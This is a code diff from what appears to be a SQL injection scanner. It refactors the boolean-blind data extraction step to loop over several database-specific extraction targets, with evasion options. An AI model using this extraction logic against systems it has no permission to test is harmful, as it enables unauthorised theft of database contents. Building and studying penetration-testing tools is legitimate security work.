@@ -224,26 +224,28 @@ def _test_boolean(
             ))
             # Level 3: attempt data extraction via binary-search char extractor
             if opts.level >= 3 and confirmed:
-                from .extract import extract_value
+                from .extract import extract_value, get_extraction_targets
                 _dbms = getattr(opts, "dbms", "auto")
-                _expr = "VERSION()" if _dbms not in ("sqlite", "oracle") else "sqlite_version()" if _dbms == "sqlite" else "(SELECT banner FROM v$version WHERE rownum=1)"
-                _extracted = extract_value(
-                    expr=_expr,
-                    surface={"url": url, "method": method, "params": params,
+                _surface = {"url": url, "method": method, "params": params,
                              "single_param": param,
-                             "json_body": json_body, "path_index": path_index},
-                    evasions=[evasion],
-                    opts=opts,
-                    injector=injector,
-                    baseline=baseline,
-                    mode="boolean",
-                )
-                if _extracted:
-                    logger.finding("Extracted via boolean blind: %s param=%s value=%s", url, param, _extracted)
-                    result.append_extraction(ExtractionFinding(
-                        url=url, parameter=param, method=method,
-                        expr=_expr, value=_extracted, mode="boolean",
-                    ))
+                             "json_body": json_body, "path_index": path_index}
+                for _label, _expr in get_extraction_targets(_dbms):
+                    _extracted = extract_value(
+                        expr=_expr,
+                        surface=_surface,
+                        evasions=[evasion],
+                        opts=opts,
+                        injector=injector,
+                        baseline=baseline,
+                        mode="boolean",
+                    )
+                    if _extracted:
+                        logger.finding("Extracted via boolean blind: %s param=%s %s=%s",
+                                       url, param, _label, _extracted)
+                        result.append_extraction(ExtractionFinding(
+                            url=url, parameter=param, method=method,
+                            expr=_expr, value=_extracted, mode="boolean",
+                        ))
             return  # one finding per param
 
 
